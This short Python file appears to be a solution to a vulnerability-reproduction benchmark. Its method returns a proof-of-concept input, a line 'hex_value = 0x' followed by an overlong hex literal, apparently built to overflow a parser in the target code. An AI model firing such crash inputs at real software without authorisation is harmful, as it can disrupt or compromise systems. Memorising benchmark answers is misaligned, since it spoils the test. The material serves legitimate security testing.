class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = b"hex_value = 0x"
        hex_part = b"deadbeef" * 66 + b"dead"
        suffix = b"\n"
        poc = prefix + hex_part + suffix
        assert len(poc) == 547
        return poc